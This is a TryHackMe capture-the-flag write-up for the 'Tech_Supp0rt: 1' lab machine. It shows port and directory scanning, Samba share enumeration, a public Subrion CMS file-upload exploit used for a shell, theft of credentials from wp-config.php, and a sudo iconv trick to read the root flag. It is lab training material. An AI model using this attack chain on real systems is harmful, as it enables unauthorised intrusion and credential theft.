# Tech_Supp0rt: 1 – Writeup [TryHackMe](https://tryhackme.com/dashboard)

## Scanning

We start with a full port scan:

```python
nmap -sC -sV -p- -T4 10.10.160.173
```
Results:

```python
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu
```
## Web Enumeration

Visiting port 80, we see the default Apache page.

We run a directory brute force:

```python
gobuster dir -u http://10.10.160.173 -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt
```
Interesting results:

```python
/phpinfo.php
/test
/wordpress
```
/test → a phishing site, not useful.

/phpinfo.php → just PHP info.

## Samba Enumeration

Next, we enumerate Samba shares:

```python
nmap -p139,445 --script smb-enum-shares,smb-ls 10.10.160.173
```
We discover a share:

```python
10.10.160.173\websvr:
  enter.txt
```
We download it:

```python
smbget smb://10.10.160.173/websvr/enter.txt
```
Inside ```enter.txt```, we find a hint:

```python
GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:************* [cooked with magical formula]
Wordpress creds
|->
```
## Subrion CMS

Following the hint, we navigate to:

```python
http://10.10.160.173/subrion/panel/
```
We successfully access the admin panel.

The CMS version is revealed, and after some research we find a public exploit.

```python
searchsploit subrion 4.2.1

Subrion CMS 4.2.1 - Arbitrary File Upload                                         | php/webapps/49876.py

 searchsploit -m php/webapps/49876.py
```
We execute it and gain RCE.

Example usage:

```python
python3 exploit.py -u http://10.10.160.173/subrion/panel/ -l admin -p <password>
```
This provides us with a shell.

## Credential Harvesting

Inside the machine, we check the WordPress configuration:

```python
cat ../../wordpress/wp-config.php
```
We find database credentials, including a password.

Checking ```/home```, we see a user:

```python
scamsite
```
We SSH in with the discovered credentials:

```python
ssh scamsite@10.10.160.173
```
## Privilege Escalation

Checking sudo privileges:

```python
sudo -l
```
Output:

```python
(ALL) NOPASSWD: /usr/bin/iconv
```
On GTFOBins, we find a privilege escalation technique with iconv.

We read the root flag directly:

```python
LFILE=/root/root.txt

sudo iconv -f 8859_1 -t 8859_1 "$LFILE"
```

And we successfully capture the root flag
